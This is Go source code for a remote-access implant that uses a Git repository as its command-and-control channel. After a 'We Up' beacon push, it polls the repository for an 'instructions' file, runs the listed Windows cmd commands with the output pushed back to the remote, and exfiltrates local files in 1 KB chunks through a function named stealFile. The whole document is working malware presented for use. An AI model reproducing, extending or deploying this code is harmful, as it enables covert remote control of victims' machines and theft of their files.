package main

import (
	"bufio"
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"

	billy "github.com/go-git/go-billy/v5"
	memfs "github.com/go-git/go-billy/v5/memfs"
	util "github.com/go-git/go-billy/v5/util"
	git "github.com/go-git/go-git/v5"
	http "github.com/go-git/go-git/v5/plumbing/transport/http"
	memory "github.com/go-git/go-git/v5/storage/memory"
)

const USERNAME = ""
const ACCESS_TOKEN = ""
const REPOSITORY = ""
const FILE_SIZE = 1024

var storer *memory.Storage
var fs billy.Filesystem

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randString() string {
	b := make([]rune, 6)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func handleError(err error) {
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

func execCommand(r *git.Repository, auth *http.BasicAuth, fs billy.Filesystem, command string) {
	w, err := r.Worktree()
	handleError(err)

	re := regexp.MustCompile("\\s+")
	argsplit := re.Split(string(command), -1)
	argsplit = append([]string{"/C"}, argsplit...)

	c := exec.Command("cmd", argsplit...)

	filepath := command + randString()
	newFile, err := fs.Create(filepath)
	c.Stdout = newFile
	c.Stderr = newFile

	err = c.Run()
	handleError(err)

	w.Add(filepath)

	w.Commit("", &git.CommitOptions{})

	//Push the code to the remote
	err = r.Push(&git.PushOptions{
		RemoteName: "origin",
		Auth:       auth,
	})
	handleError(err)

	fs.Remove(filepath)
}

func stealFile(r *git.Repository, auth *http.BasicAuth, fs billy.Filesystem, filepath string) {
	w, err := r.Worktree()
	handleError(err)

	filesplit := strings.Split(filepath, "\\")
	filename := filesplit[len(filesplit)-1] + randString()

	filePtr, err := os.Open(filepath)
	if err != nil {
		fmt.Println(err)
	}
	reader := bufio.NewReader(filePtr)

	buf := make([]byte, FILE_SIZE)
	for i := 0; true; i++ {
		n, rerr := reader.Read(buf)
		if n == 0 {
			break
		}
		filepath := filename + strconv.Itoa(i)
		newFile, err := fs.Create(filepath)
		handleError(err)

		newFile.Write(buf[:n])
		newFile.Close()

		w.Add(filepath)

		w.Commit("", &git.CommitOptions{})

		//Push the code to the remote
		err = r.Push(&git.PushOptions{
			RemoteName: "origin",
			Auth:       auth,
		})
		handleError(err)

		fs.Remove(filepath)

		if rerr == io.EOF {
			break
		}
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	storer = memory.NewStorage()
	fs = memfs.New()

	auth := &http.BasicAuth{
		Username: USERNAME,
		Password: ACCESS_TOKEN,
	}

	r, err := git.Clone(storer, fs, &git.CloneOptions{
		URL:  REPOSITORY,
		Auth: auth,
	})
	handleError(err)

	w, err := r.Worktree()
	handleError(err)

	filepath := "We Up"
	newFile, err := fs.Create(filepath)
	handleError(err)

	newFile.Write([]byte(randString()))
	newFile.Close()

	w.Add(filepath)

	w.Commit("", &git.CommitOptions{})

	err = r.Push(&git.PushOptions{
		RemoteName: "origin",
		Auth:       auth,
	})
	handleError(err)

	do_print := true

	for true {
		if do_print {
			content, err := util.ReadFile(fs, "./instructions")
			handleError(err)

			re := regexp.MustCompile("\r?\n")

			for _, command := range re.Split(string(content), -1) {
				re := regexp.MustCompile(`"[^"]+"`)
				argument := re.FindString(command)
				if argument == "" {
					break
				}
				argument = argument[1 : len(argument)-1]
				switch {
				case strings.HasPrefix(command, "cmd"):
					execCommand(r, auth, fs, argument)
				case strings.HasPrefix(command, "exfil"):
					stealFile(r, auth, fs, argument)
				}
			}
		}
		time.Sleep(10 * time.Second)

		err = r.Fetch(&git.FetchOptions{
			Auth: auth,
		})
		if err == git.NoErrAlreadyUpToDate {
			do_print = false
			continue
		}
		handleError(err)
		do_print = true
	}

}
